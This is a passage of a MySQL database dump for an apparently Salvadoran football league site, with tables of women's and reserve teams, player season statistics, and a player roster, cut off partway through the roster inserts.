CREATE TABLE `equipos_primera_femenina` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `nombre` varchar(100) DEFAULT NULL,
  `ciudad` varchar(100) DEFAULT NULL,
  `estadio` varchar(100) DEFAULT NULL,
  `logo` varchar(255) DEFAULT NULL,
  `formacion` varchar(10) DEFAULT '4-4-2',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=14 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `equipos_primera_femenina`
--

LOCK TABLES `equipos_primera_femenina` WRITE;
/*!40000 ALTER TABLE `equipos_primera_femenina` DISABLE KEYS */;
INSERT INTO `equipos_primera_femenina` VALUES
(1,'Alianza FC Women ','San Salvador','Estadio Cuscatlan ','uploads/1783693048_Alianza_women.jpg','4-4-2'),
(2,'CD Águila Femenino','San Miguel','Estadio Juan Francisco Barraza','uploads/1782942606_aguila femenil.png','4-4-2'),
(3,'C.D. FAS Femenino','Santa Ana','Estadio Óscar Alberto Quiteño','uploads/1784128548_FAS.png','4-4-2'),
(4,'C.D. Municipal Limeño Femenil','La Unión','Estadio Dr. Ramón Flores Berríos','uploads/1784128664_Limeño.png','4-4-2'),
(5,'A.D. Isidro Metapán Femenino','Santa Ana','Estadio Jorge \"Calero\" Suárez Landaverde','uploads/1784128867_metapan.png','4-4-2'),
(6,'C.D. Cacahuatique Femenino','San Miguel','Estadio Bolliat','uploads/1784128962_cacahuatique.png','4-4-2'),
(7,'Inter Tecla Women','La Paz','Estadio Antonio Toledo Valle','uploads/1784129111_intertecla.png','4-4-2'),
(9,'INCA Aruba (F)','','','uploads/1784900771_incaaruba.png','4-4-2'),
(10,'CD Luis Angel Firpo (F)','Usulután','Estadio Sergio Torres Rivera','uploads/1784900844_LAFIRPO.png','4-4-2'),
(11,'CD Fuerte San Francisco (F)','San Francisco Gotera','Estadio Correcaminos','uploads/1784901093_morazan.png','4-4-2'),
(12,'CD Platense (F)','Zacatecoluca','Estadio Antonio Toledo Valle','uploads/1784901111_platense.png','4-4-2'),
(13,'Atlético Balboa (F)','La Unión','Estadio Marcelino Imbers','uploads/1784901128_balboa.png','4-4-2');
/*!40000 ALTER TABLE `equipos_primera_femenina` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `equipos_reservas`
--

DROP TABLE IF EXISTS `equipos_reservas`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `equipos_reservas` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `nombre` varchar(100) NOT NULL,
  `ciudad` varchar(100) DEFAULT NULL,
  `estadio` varchar(150) DEFAULT NULL,
  `logo` varchar(255) DEFAULT NULL,
  `formacion` varchar(10) DEFAULT '4-4-2',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=193 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `equipos_reservas`
--

LOCK TABLES `equipos_reservas` WRITE;
/*!40000 ALTER TABLE `equipos_reservas` DISABLE KEYS */;
INSERT INTO `equipos_reservas` VALUES
(181,'L.A. Firpo Reservas','Usulután',NULL,'uploads/1775237339_LAFIRPO.png','4-4-2'),
(182,'Alianza F.C. Reservas','San Salvador',NULL,'uploads/1775237448_alianzafc.png','4-4-2'),
(183,'C.D. Águila Reservas','San Miguel',NULL,'uploads/1775237638_Aguila.png','4-4-2'),
(184,'C.D. Municipal Limeño Reservas','Santa Rosa de Lima',NULL,'uploads/escudos/equipo_7_1779945347.png','4-4-2'),
(185,'Inter Tecla Reservas','Santa Tecla',NULL,'uploads/escudos/equipo_8_1782942322.png','4-4-2'),
(186,'A.D. Isidro Metapán Reservas','Metapán',NULL,'uploads/1775241152_metapan.png','4-4-2'),
(187,'C.D. Cacahuatique Reservas','Ciudad Barrios',NULL,'uploads/1775242518_cacahuatique.png','4-4-2'),
(188,'C.D. Platense Reservas','Zacatecoluca',NULL,'uploads/1775242938_platense.png','4-4-2'),
(189,'C.D. Fuerte San Francisco Reservas','San Francisco Gotera',NULL,'uploads/1775243154_morazan.png','4-4-2'),
(190,'C.D. FAS Reservas','Santa Ana',NULL,'uploads/1775580005_FAS.png','4-4-2'),
(191,'CD ATL.BALBOA Reservas','La Unión',NULL,'uploads/1784694388_balboa.png','4-4-2'),
(192,'CD Inca Aruba Reservas','Entre Ríos',NULL,'uploads/1784694507_incaaruba.png','4-4-2');
/*!40000 ALTER TABLE `equipos_reservas` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `equipos_segunda`
--

DROP TABLE IF EXISTS `equipos_segunda`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `equipos_segunda` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `nombre` varchar(100) NOT NULL,
  `ciudad` varchar(100) DEFAULT NULL,
  `estadio` varchar(150) DEFAULT NULL,
  `logo` varchar(255) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `formacion` varchar(10) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `equipos_segunda`
--

LOCK TABLES `equipos_segunda` WRITE;
/*!40000 ALTER TABLE `equipos_segunda` DISABLE KEYS */;
/*!40000 ALTER TABLE `equipos_segunda` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `equipos_tercera`
--

DROP TABLE IF EXISTS `equipos_tercera`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `equipos_tercera` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `nombre` varchar(100) NOT NULL,
  `ciudad` varchar(100) DEFAULT NULL,
  `estadio` varchar(150) DEFAULT NULL,
  `grupo` varchar(50) DEFAULT NULL,
  `logo` varchar(255) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `formacion` varchar(10) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `equipos_tercera`
--

LOCK TABLES `equipos_tercera` WRITE;
/*!40000 ALTER TABLE `equipos_tercera` DISABLE KEYS */;
/*!40000 ALTER TABLE `equipos_tercera` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `estadisticas_jugadores`
--

DROP TABLE IF EXISTS `estadisticas_jugadores`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `estadisticas_jugadores` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `jugador_id` int(11) NOT NULL,
  `temporada` varchar(20) DEFAULT '2025-2026',
  `partidos_jugados` int(11) DEFAULT 0,
  `goles` int(11) DEFAULT 0,
  `asistencias` int(11) DEFAULT 0,
  `goles_cabeza` int(11) DEFAULT 0,
  `goles_tiro_libre` int(11) DEFAULT 0,
  `goles_penal` int(11) DEFAULT 0,
  `tarjetas_amarillas` int(11) DEFAULT 0,
  `tarjetas_rojas` int(11) DEFAULT 0,
  `minutos_jugados` int(11) DEFAULT 0,
  `goles_recibidos` int(11) DEFAULT 0,
  `vaya_invicta` int(11) DEFAULT 0,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uniq_jugador_temp` (`jugador_id`,`temporada`),
  KEY `idx_stats_goles` (`goles` DESC),
  KEY `idx_stats_amarillas` (`tarjetas_amarillas` DESC),
  KEY `idx_stats_rojas` (`tarjetas_rojas` DESC),
  KEY `idx_stats_portero` (`goles_recibidos`),
  CONSTRAINT `estadisticas_jugadores_ibfk_1` FOREIGN KEY (`jugador_id`) REFERENCES `jugadores` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=497 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `estadisticas_jugadores`
--

LOCK TABLES `estadisticas_jugadores` WRITE;
/*!40000 ALTER TABLE `estadisticas_jugadores` DISABLE KEYS */;
INSERT INTO `estadisticas_jugadores` VALUES
(171,147,'2025-2026',20,0,0,0,0,0,1,0,1800,18,7),
(172,148,'2025-2026',4,0,0,0,0,0,0,0,180,5,1),
(173,149,'2025-2026',2,0,0,0,0,0,0,0,90,2,0),
(174,150,'2025-2026',19,2,1,2,0,0,3,0,1650,0,0),
(175,151,'2025-2026',18,2,0,1,0,0,2,0,1530,0,0),
(176,152,'2025-2026',17,0,1,0,0,0,3,1,1420,0,0),
(177,153,'2025-2026',16,0,0,0,0,0,2,0,1300,0,0),
(178,154,'2025-2026',19,0,2,0,0,0,1,0,1620,0,0),
(179,155,'2025-2026',16,0,0,0,0,0,2,0,1280,0,0),
(180,156,'2025-2026',10,0,0,0,0,0,1,0,700,0,0),
(181,157,'2025-2026',8,0,0,0,0,0,1,0,480,0,0),
(182,158,'2025-2026',7,0,1,0,0,0,1,0,420,0,0),
(183,159,'2025-2026',18,2,4,0,0,0,3,0,1520,0,0),
(184,160,'2025-2026',17,3,5,0,0,0,2,0,1400,0,0),
(185,161,'2025-2026',16,1,3,0,0,0,2,0,1300,0,0),
(186,162,'2025-2026',19,2,3,0,0,0,3,0,1580,0,0),
(187,163,'2025-2026',11,0,2,0,0,0,2,0,760,0,0),
(188,164,'2025-2026',9,1,1,0,0,0,1,0,590,0,0),
(189,165,'2025-2026',10,1,0,0,0,0,2,0,680,0,0),
(190,166,'2025-2026',7,0,1,0,0,0,0,0,380,0,0),
(191,167,'2025-2026',6,0,0,0,0,0,1,0,320,0,0),
(192,168,'2025-2026',5,0,0,0,0,0,0,0,260,0,0),
(193,169,'2025-2026',17,4,2,1,0,1,2,0,1380,0,0),
(194,170,'2025-2026',19,4,1,0,0,1,1,0,1520,0,0),
(195,171,'2025-2026',15,3,2,1,0,0,2,0,1150,0,0),
(196,172,'2025-2026',16,3,1,0,0,1,1,0,1200,0,0),
(197,173,'2025-2026',9,1,0,0,0,0,1,0,540,0,0),
(198,174,'2025-2026',8,4,0,1,0,2,0,0,480,0,0),
(454,449,'2025-2026',20,0,0,0,0,0,1,0,1800,19,6),
(455,450,'2025-2026',5,0,0,0,0,0,0,0,270,6,1),
(456,451,'2025-2026',2,0,0,0,0,0,0,0,90,3,0),
(457,452,'2025-2026',18,0,1,0,0,0,2,0,1530,0,0),
(458,453,'2025-2026',17,0,0,0,0,0,2,0,1420,0,0),
(459,454,'2025-2026',18,0,1,0,0,0,3,0,1520,0,0),
(460,455,'2025-2026',10,0,0,0,0,0,1,0,720,0,0),
(461,456,'2025-2026',16,0,0,0,0,0,2,0,1300,0,0),
(462,457,'2025-2026',9,0,0,0,0,0,1,0,590,0,0),
(463,458,'2025-2026',8,0,0,0,0,0,1,0,490,0,0),
(464,459,'2025-2026',18,1,3,0,0,0,2,0,1480,0,0),
(465,460,'2025-2026',12,0,2,0,0,0,1,0,820,0,0),
(466,461,'2025-2026',17,2,3,0,0,0,2,0,1370,0,0),
(467,462,'2025-2026',10,0,1,0,0,0,1,0,640,0,0),
(468,463,'2025-2026',16,3,2,0,0,0,2,0,1280,0,0),
(469,464,'2025-2026',19,1,4,0,0,0,3,0,1560,0,0),
(470,465,'2025-2026',16,2,3,0,0,0,2,0,1250,0,0),
(471,466,'2025-2026',18,6,2,1,0,2,2,0,1430,0,0),
(472,467,'2025-2026',15,5,3,0,0,1,1,0,1150,0,0),
(473,468,'2025-2026',10,2,1,0,0,0,1,0,620,0,0),
(474,469,'2025-2026',8,1,0,0,0,0,0,0,410,0,0),
(496,159,'2026-2027',0,1,0,0,0,0,0,0,0,0,0);
/*!40000 ALTER TABLE `estadisticas_jugadores` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `estadisticas_jugadores_ascenso`
--

DROP TABLE IF EXISTS `estadisticas_jugadores_ascenso`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `estadisticas_jugadores_ascenso` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `jugador_id` int(11) NOT NULL,
  `temporada` varchar(20) DEFAULT '2025-2026',
  `partidos_jugados` int(11) DEFAULT 0,
  `goles` int(11) DEFAULT 0,
  `asistencias` int(11) DEFAULT 0,
  `goles_cabeza` int(11) DEFAULT 0,
  `goles_tiro_libre` int(11) DEFAULT 0,
  `goles_penal` int(11) DEFAULT 0,
  `tarjetas_amarillas` int(11) DEFAULT 0,
  `tarjetas_rojas` int(11) DEFAULT 0,
  `minutos_jugados` int(11) DEFAULT 0,
  `goles_recibidos` int(11) DEFAULT 0,
  `vaya_invicta` int(11) DEFAULT 0,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uniq_jugador_temp` (`jugador_id`,`temporada`),
  KEY `jugador_id` (`jugador_id`),
  KEY `goles` (`goles`),
  KEY `tarjetas_amarillas` (`tarjetas_amarillas`),
  KEY `tarjetas_rojas` (`tarjetas_rojas`),
  KEY `goles_recibidos` (`goles_recibidos`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `estadisticas_jugadores_ascenso`
--

LOCK TABLES `estadisticas_jugadores_ascenso` WRITE;
/*!40000 ALTER TABLE `estadisticas_jugadores_ascenso` DISABLE KEYS */;
INSERT INTO `estadisticas_jugadores_ascenso` VALUES
(1,1,'2025-2026',3,2,1,0,0,0,0,0,90,0,0),
(2,2,'2025-2026',0,0,0,0,0,0,0,0,0,0,0);
/*!40000 ALTER TABLE `estadisticas_jugadores_ascenso` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `estadisticas_jugadores_femenina`
--

DROP TABLE IF EXISTS `estadisticas_jugadores_femenina`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `estadisticas_jugadores_femenina` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `jugador_id` int(11) NOT NULL,
  `temporada` varchar(20) DEFAULT '2025-2026',
  `partidos_jugados` int(11) DEFAULT 0,
  `goles` int(11) DEFAULT 0,
  `asistencias` int(11) DEFAULT 0,
  `goles_cabeza` int(11) DEFAULT 0,
  `goles_tiro_libre` int(11) DEFAULT 0,
  `goles_penal` int(11) DEFAULT 0,
  `tarjetas_amarillas` int(11) DEFAULT 0,
  `tarjetas_rojas` int(11) DEFAULT 0,
  `minutos_jugados` int(11) DEFAULT 0,
  `goles_recibidos` int(11) DEFAULT 0,
  `vaya_invicta` int(11) DEFAULT 0,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uniq_jugador_temp` (`jugador_id`,`temporada`),
  KEY `jugador_id` (`jugador_id`),
  KEY `goles` (`goles`),
  KEY `tarjetas_amarillas` (`tarjetas_amarillas`),
  KEY `tarjetas_rojas` (`tarjetas_rojas`),
  KEY `goles_recibidos` (`goles_recibidos`)
) ENGINE=InnoDB AUTO_INCREMENT=23 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `estadisticas_jugadores_femenina`
--

LOCK TABLES `estadisticas_jugadores_femenina` WRITE;
/*!40000 ALTER TABLE `estadisticas_jugadores_femenina` DISABLE KEYS */;
INSERT INTO `estadisticas_jugadores_femenina` VALUES
(1,1,'2025-2026',0,0,0,0,0,0,0,0,0,0,0),
(2,2,'2025-2026',0,0,0,0,0,0,0,0,0,0,0),
(3,3,'2025-2026',0,0,0,0,0,0,0,0,0,0,0),
(4,4,'2025-2026',0,0,0,0,0,0,0,0,0,0,0),
(5,5,'2025-2026',0,0,0,0,0,0,0,0,0,0,0),
(6,6,'2025-2026',0,0,0,0,0,0,0,0,0,0,0),
(7,7,'2025-2026',0,0,0,0,0,0,0,0,0,0,0),
(8,8,'2025-2026',0,0,0,0,0,0,0,0,0,0,0),
(9,9,'2025-2026',0,0,0,0,0,0,0,0,0,0,0),
(10,10,'2025-2026',0,0,0,0,0,0,0,0,0,0,0),
(11,11,'2025-2026',0,0,0,0,0,0,0,0,0,0,0),
(12,12,'2025-2026',0,0,0,0,0,0,0,0,0,0,0),
(13,13,'2025-2026',0,0,0,0,0,0,0,0,0,0,0),
(14,14,'2025-2026',0,0,0,0,0,0,0,0,0,0,0),
(15,15,'2025-2026',0,0,0,0,0,0,0,0,0,0,0),
(16,16,'2025-2026',0,0,0,0,0,0,0,0,0,0,0),
(17,17,'2025-2026',0,0,0,0,0,0,0,0,0,0,0),
(18,18,'2025-2026',0,0,0,0,0,0,0,0,0,0,0),
(19,19,'2025-2026',0,0,0,0,0,0,0,0,0,0,0),
(20,20,'2025-2026',0,0,0,0,0,0,0,0,0,0,0),
(21,21,'2025-2026',0,0,0,0,0,0,0,0,0,0,0),
(22,22,'2025-2026',0,0,0,0,0,0,0,0,0,0,0);
/*!40000 ALTER TABLE `estadisticas_jugadores_femenina` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `estadisticas_jugadores_segunda`
--

DROP TABLE IF EXISTS `estadisticas_jugadores_segunda`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `estadisticas_jugadores_segunda` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `jugador_id` int(11) NOT NULL,
  `temporada` varchar(20) DEFAULT '2025-2026',
  `partidos_jugados` int(11) DEFAULT 0,
  `goles` int(11) DEFAULT 0,
  `asistencias` int(11) DEFAULT 0,
  `goles_cabeza` int(11) DEFAULT 0,
  `goles_tiro_libre` int(11) DEFAULT 0,
  `goles_penal` int(11) DEFAULT 0,
  `tarjetas_amarillas` int(11) DEFAULT 0,
  `tarjetas_rojas` int(11) DEFAULT 0,
  `minutos_jugados` int(11) DEFAULT 0,
  `goles_recibidos` int(11) DEFAULT 0,
  `vaya_invicta` int(11) DEFAULT 0,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uniq_jugador_temp` (`jugador_id`,`temporada`),
  KEY `jugador_id` (`jugador_id`),
  KEY `goles` (`goles`),
  KEY `tarjetas_amarillas` (`tarjetas_amarillas`),
  KEY `tarjetas_rojas` (`tarjetas_rojas`),
  KEY `goles_recibidos` (`goles_recibidos`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `estadisticas_jugadores_segunda`
--

LOCK TABLES `estadisticas_jugadores_segunda` WRITE;
/*!40000 ALTER TABLE `estadisticas_jugadores_segunda` DISABLE KEYS */;
/*!40000 ALTER TABLE `estadisticas_jugadores_segunda` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `estadisticas_jugadores_tercera`
--

DROP TABLE IF EXISTS `estadisticas_jugadores_tercera`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `estadisticas_jugadores_tercera` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `jugador_id` int(11) NOT NULL,
  `temporada` varchar(20) DEFAULT '2025-2026',
  `partidos_jugados` int(11) DEFAULT 0,
  `goles` int(11) DEFAULT 0,
  `asistencias` int(11) DEFAULT 0,
  `goles_cabeza` int(11) DEFAULT 0,
  `goles_tiro_libre` int(11) DEFAULT 0,
  `goles_penal` int(11) DEFAULT 0,
  `tarjetas_amarillas` int(11) DEFAULT 0,
  `tarjetas_rojas` int(11) DEFAULT 0,
  `minutos_jugados` int(11) DEFAULT 0,
  `goles_recibidos` int(11) DEFAULT 0,
  `vaya_invicta` int(11) DEFAULT 0,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uniq_jugador_temp_ter` (`jugador_id`,`temporada`),
  KEY `idx_stats_goles_ter` (`goles` DESC),
  KEY `idx_stats_amarillas_ter` (`tarjetas_amarillas` DESC),
  KEY `idx_stats_rojas_ter` (`tarjetas_rojas` DESC),
  KEY `idx_stats_portero_ter` (`goles_recibidos`),
  CONSTRAINT `estadisticas_jugadores_tercera_ibfk_1` FOREIGN KEY (`jugador_id`) REFERENCES `jugadores_tercera` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `estadisticas_jugadores_tercera`
--

LOCK TABLES `estadisticas_jugadores_tercera` WRITE;
/*!40000 ALTER TABLE `estadisticas_jugadores_tercera` DISABLE KEYS */;
/*!40000 ALTER TABLE `estadisticas_jugadores_tercera` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jugadores`
--

DROP TABLE IF EXISTS `jugadores`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `jugadores` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `equipo_id` int(11) NOT NULL,
  `nombre` varchar(150) NOT NULL,
  `posicion` varchar(30) NOT NULL DEFAULT 'centrodelantero',
  `numero_camiseta` int(11) DEFAULT NULL,
  `foto` varchar(255) DEFAULT NULL,
  `edad` int(11) DEFAULT NULL,
  `nacionalidad` varchar(100) DEFAULT NULL,
  `fecha_creacion` timestamp NULL DEFAULT current_timestamp(),
  `posicion_x` decimal(5,2) DEFAULT NULL,
  `posicion_y` decimal(5,2) DEFAULT NULL,
  `pos_x` float DEFAULT NULL,
  `pos_y` float DEFAULT NULL,
  `es_titular` tinyint(1) DEFAULT 0,
  PRIMARY KEY (`id`),
  KEY `idx_jugador_equipo` (`equipo_id`),
  CONSTRAINT `jugadores_ibfk_1` FOREIGN KEY (`equipo_id`) REFERENCES `equipos` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=682 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jugadores`
--

LOCK TABLES `jugadores` WRITE;
/*!40000 ALTER TABLE `jugadores` DISABLE KEYS */;
INSERT INTO `jugadores` VALUES
(147,6,'Benji Villalobos','portero',1,NULL,30,'Salvadoreño','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(148,6,'Jairo Guardado','portero',12,NULL,24,'Salvadoreño','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(149,6,'Osmán Loza','portero',22,NULL,23,'Salvadoreño','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(150,6,'Ronald Rodríguez','defensa',4,NULL,29,'Salvadoreño','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(151,6,'Julio Sibrián','defensa',3,NULL,28,'Salvadoreño','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(152,6,'Erick Cabalceta','defensa',5,NULL,26,'Costarricense','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(153,6,'Jefferson Perla','defensa',6,NULL,24,'Salvadoreño','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(154,6,'Tereso Benítez','defensa',2,NULL,31,'Salvadoreño','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(155,6,'Walter Pineda','defensa',15,NULL,27,'Salvadoreño','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(156,6,'Juan Franco Cacace','defensa',17,NULL,25,'Uruguayo','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(157,6,'José Guatemala','defensa',20,NULL,23,'Salvadoreño','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(158,6,'Stiven Dávila','defensa',16,NULL,22,'Colombiano','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(159,6,'Santos Ortiz','centrocampista',8,NULL,27,'Salvadoreño','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(160,6,'Tomás Granitto','centrocampista',10,NULL,26,'Argentino','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(161,6,'Diego Gregori','centrocampista',7,NULL,25,'Argentino','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(162,6,'Marcelo Díaz','centrocampista',11,NULL,28,'Salvadoreño','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(163,6,'Jairo Martínez','centrocampista',14,NULL,24,'Salvadoreño','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(164,6,'Bryan Lovo','centrocampista',19,NULL,22,'Salvadoreño','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(165,6,'Joel Turcios','centrocampista',21,NULL,26,'Salvadoreño','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(166,6,'Carlos Ortiz','centrocampista',23,NULL,23,'Salvadoreño','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(167,6,'Marvin Benitez Jr','centrocampista',18,NULL,21,'Salvadoreño','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(168,6,'Herberth Marcelo Diaz Rivas','centrocampista',24,NULL,22,'Salvadoreño','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(169,6,'Federico Andrada','delantero',9,NULL,28,'Argentino','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(170,6,'Dixon Rivas','delantero',18,NULL,26,'Colombiano','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(171,6,'Ricardo Villatoro','delantero',13,NULL,25,'Salvadoreño','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(172,6,'Carlos Garay','delantero',11,NULL,27,'Salvadoreño','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(173,6,'Allan Benítez','delantero',25,NULL,22,'Salvadoreño','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(174,6,'Eduardo Cruz','delantero',26,NULL,24,'Salvadoreño','2026-04-17 21:03:03',NULL,NULL,NULL,NULL,0),
(449,8,'sergio sibrián molina','portero',1,NULL,21,'salvadoreño','2026-07-22 19:42:13',NULL,NULL,NULL,NULL,1),
(450,8,'hector ramírez carvajal','portero',12,NULL,34,'salvadoreño','2026-07-22 19:42:13',NULL,NULL,NULL,NULL,0),
(451,8,'adriel martínez castillo','portero',22,NULL,23,'salvadoreño','2026-07-22 19:42:13',NULL,NULL,NULL,NULL,0),
(452,8,'lautaro toledo pacheco','central',4,NULL,23,'argentino','2026-07-22 19:42:13',NULL,NULL,NULL,NULL,1),
(453,8,'guillermo nieves','central',3,NULL,27,'salvadoreño','2026-07-22 19:42:13',NULL,NULL,NULL,NULL,1),
(454,8,'ruben marroquin','central',5,NULL,32,'salvadoreño','2026-07-22 19:42:13',NULL,NULL,NULL,NULL,1),
(455,8,'jorge gonzález lemus','central',6,NULL,21,'salvadoreño','2026-07-22 19:42:13',NULL,NULL,NULL,NULL,0),
(456,8,'alexis montes renderos','central',2,NULL,27,'salvadoreño','2026-07-22 19:42:13',NULL,NULL,NULL,NULL,1),
(457,8,'kevin molina martínez','central',15,NULL,24,'salvadoreño','2026-07-22 19:42:13',NULL,NULL,NULL,NULL,0),
(458,8,'kevin menjívar henriquez','central',16,NULL,24,'salvadoreño','2026-07-22 19:42:13',NULL,NULL,NULL,NULL,0),
(459,8,'kevin oviedo','medio_central',8,NULL,27,'salvadoreño','2026-07-22 19:42:13',NULL,NULL,NULL,NULL,1),
(460,8,'josé serrano montano','medio_central',10,NULL,21,'salvadoreño','2026-07-22 19:42:13',NULL,NULL,NULL,NULL,0),
(461,8,'diego coca','medio_central',7,NULL,30,'salvadoreño','2026-07-22 19:42:13',NULL,NULL,NULL,NULL,1),
(462,8,'bryan santos','medio_central',14,NULL,19,'salvadoreño','2026-07-22 19:42:13',NULL,NULL,NULL,NULL,0),
(463,8,'guillermo stradella','medio_central',11,NULL,26,'argentino','2026-07-22 19:42:13',NULL,NULL,NULL,NULL,1),
(464,8,'darwin cerén','medio_central',20,NULL,27,'salvadoreño','2026-07-22 19:42:13',NULL,NULL,NULL,NULL,1),
(465,8,'jairo henríquez','medio_central',21,NULL,32,'salvadoreño','2026-07-22 19:42:13',NULL,NULL,NULL,NULL,1),
(466,8,'melvin alfaro','centrodelantero',9,NULL,26,'salvadoreño','2026-07-22 19:42:13',NULL,NULL,NULL,NULL,1),
(467,8,'michell mercado','centrodelantero',18,NULL,26,'salvadoreño','2026-07-22 19:42:13',NULL,NULL,NULL,NULL,0),
(468,8,'carlos alfaro','centrodelantero',NULL,NULL,23,'salvadoreño','2026-07-22 19:42:13',NULL,NULL,NULL,NULL,0),
(469,8,'edson garcía','centrodelantero',25,NULL,21,'salvadoreño','2026-07-22 19:42:13',NULL,NULL,NULL,NULL,0),
(489,18,'Aldair McKenzie','centrodelantero',NULL,NULL,28,'Panameña','2026-07-26 08:44:36',NULL,NULL,NULL,NULL,0),
(490,18,'Brayan Paz','centrodelantero',NULL,NULL,28,'Salvadoreña','2026-07-26 08:44:36',NULL,NULL,NULL,NULL,0),
(491,18,'Aquíles Méndez','centrodelantero',NULL,NULL,33,'Salvadoreña','2026-07-26 08:44:36',NULL,NULL,NULL,NULL,0),
